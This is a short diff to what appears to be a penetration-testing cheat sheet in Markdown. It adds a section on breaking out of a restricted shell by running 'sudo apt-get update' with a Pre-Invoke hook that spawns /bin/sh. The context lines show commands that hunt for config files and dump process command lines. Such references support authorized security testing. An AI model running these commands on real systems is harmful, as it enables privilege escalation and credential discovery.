@@ -338,9 +338,10 @@ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
 find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
 ```
 
-****
+**Use apt-get to break out of restrictive shell**
 
+apt-get can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command
 
 ```JavaScript
-
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
